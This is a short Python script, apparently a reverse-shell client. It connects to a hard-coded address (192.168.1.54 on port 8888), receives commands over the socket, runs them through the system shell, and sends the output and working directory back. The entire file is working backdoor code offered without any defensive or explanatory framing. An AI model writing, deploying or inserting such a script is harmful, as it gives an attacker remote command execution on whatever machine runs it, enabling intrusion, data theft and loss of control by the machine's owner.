import subprocess
import socket
import os

host='192.168.1.54'
port=8888
client = socket.socket()
client.connect((host,port))

while True:
    data = client.recv(4026).decode('utf-8')
    if data[:2] == 'cd':
        os.chdir(data[3:])
    if len(data) > 0:
        cmd = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output,'utf-8')
        CurrentWD = os.getcwd()+"> "
        client.send(bytes(output_str+str(CurrentWD),'utf-8'))

        print(output_str)